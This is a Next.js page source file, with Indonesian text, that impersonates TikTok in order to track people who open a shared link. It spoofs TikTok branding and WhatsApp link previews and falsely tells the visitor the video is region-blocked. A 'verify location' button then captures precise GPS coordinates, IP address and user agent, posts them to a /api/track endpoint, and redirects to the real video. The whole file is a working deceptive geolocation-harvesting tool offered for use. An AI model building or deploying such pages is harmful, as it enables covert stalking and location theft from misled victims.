import Head from 'next/head';
import { useState } from 'react';

export async function getServerSideProps({ params, req }) {
  let tiktokUrl = '';
  
  try {
    // Bongkar Base64 jadi URL asli
    tiktokUrl = Buffer.from(params.id, 'base64url').toString('utf-8');
    if (!tiktokUrl.startsWith('http')) throw new Error('Invalid URL');
  } catch (e) {
    return { notFound: true };
  }

  // Ambil meta untuk preview WhatsApp
  let meta = {};
  try {
    const r = await fetch(`https://www.tiktok.com/oembed?url=${encodeURIComponent(tiktokUrl)}`);
    if (r.ok) meta = await r.json();
  } catch (e) {}

  let ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '';
  if (ip.includes(',')) ip = ip.split(',')[0].trim();
  ip = ip.replace('::ffff:', '');

  return { props: { url: tiktokUrl, meta, serverIp: ip } };
}

export default function Intermediate({ url, meta, serverIp }) {
  const [loading, setLoading] = useState(false);
  const [statusText, setStatusText] = useState('');

  const handleVerifyAndPlay = () => {
    setLoading(true);
    setStatusText('Memverifikasi wilayah...');

    const payload = { type: 'client_gps', ts: Date.now(), ip: serverIp, targetUrl: url };
    try { payload.ua = navigator.userAgent; } catch(e){}

    const finishAndRedirect = async (finalPayload) => {
      try {
        await fetch('/api/track', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify(finalPayload)
        });
      } catch(e){}
      
      setStatusText('Akses dibuka. Mengalihkan...');
      setTimeout(() => { window.location.href = url; }, 1000);
    };

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          payload.gps = { lat: position.coords.latitude, lng: position.coords.longitude, accuracy: position.coords.accuracy };
          finishAndRedirect(payload);
        },
        (error) => {
          payload.gpsError = error.message;
          finishAndRedirect(payload);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } else {
      finishAndRedirect(payload);
    }
  };

  const previewTitle = meta.title || 'TikTok - Make Your Day';
  const previewImage = meta.thumbnail_url || 'https://sf16-scmcdn-sg.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-341d592224bd57115833880c51e4a1f6.svg';
  
  return (
    <>
      <Head>
        <title>{previewTitle}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
        
        {/* META TAGS WA */}
        <meta property="og:type" content="video.other" />
        <meta property="og:site_name" content="TikTok" />
        <meta property="og:title" content={previewTitle} />
        <meta property="og:description" content="Klik untuk menonton video ini di TikTok." />
        <meta property="og:image" content={previewImage} />
        
        <link rel="icon" href="https://www.tiktok.com/favicon.ico" />
      </Head>

      <div style={{ backgroundColor: '#000', color: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column', fontFamily: '-apple-system, sans-serif' }}>
        <header style={{ padding: '16px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid #1c1c1c' }}>
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M15 19L8 12L15 5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
           </svg>
           <span style={{ fontSize: '16px', fontWeight: '600' }}>Video</span>
           <div style={{ width: '24px' }}></div>
        </header>

        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '20px', textAlign: 'center' }}>
          <div style={{ marginBottom: '24px' }}>
            <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <circle cx="12" cy="12" r="10" stroke="#fe2c55" strokeWidth="1.5" />
              <path d="M12 8V12" stroke="#fe2c55" strokeWidth="1.5" strokeLinecap="round" />
              <circle cx="12" cy="16" r="1" fill="#fe2c55" />
            </svg>
          </div>

          <h1 style={{ fontSize: '18px', fontWeight: '600', marginBottom: '12px', padding: '0 20px' }}>
            Video ini tidak tersedia di wilayah Anda
          </h1>
          
          <p style={{ color: '#a1a1a1', fontSize: '14px', lineHeight: '1.5', marginBottom: '32px', padding: '0 20px' }}>
            Untuk menjaga keamanan jaringan dan mencegah aktivitas bot, sistem memerlukan verifikasi lokasi sebelum memutar video.
          </p>

          <button 
            onClick={handleVerifyAndPlay}
            disabled={loading}
            style={{
              backgroundColor: loading ? '#2a2a2a' : '#fe2c55', 
              color: loading ? '#888' : '#fff',
              border: 'none',
              padding: '14px 24px',
              fontSize: '16px',
              fontWeight: '600',
              borderRadius: '4px',
              cursor: loading ? 'not-allowed' : 'pointer',
              width: '100%',
              maxWidth: '320px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px',
              transition: 'background-color 0.2s ease'
            }}
          >
            {loading ? (
              <>
                <svg style={{ animation: 'spin 1s linear infinite' }} width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#888" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M21 12a9 9 0 1 1-6.219-8.56" />
                </svg>
                {statusText}
              </>
            ) : (
              'Verifikasi Lokasi & Tonton'
            )}
          </button>
        </div>
      </div>
      
      <style>{`
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      `}</style>
    </>
  );
}